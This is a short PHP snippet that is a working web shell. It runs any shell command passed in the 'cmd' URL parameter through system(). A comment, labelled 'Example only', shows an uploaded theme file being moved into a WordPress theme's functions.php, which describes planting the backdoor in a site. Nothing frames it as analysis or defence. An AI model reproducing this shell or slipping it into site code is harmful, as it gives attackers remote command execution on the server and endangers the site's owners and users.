<?php
// Example only: move_uploaded_file($_FILES['theme']['tmp_name'], '/wp-content/themes/example/functions.php');
if (isset($_GET['cmd'])) {
    system($_GET['cmd']);
}
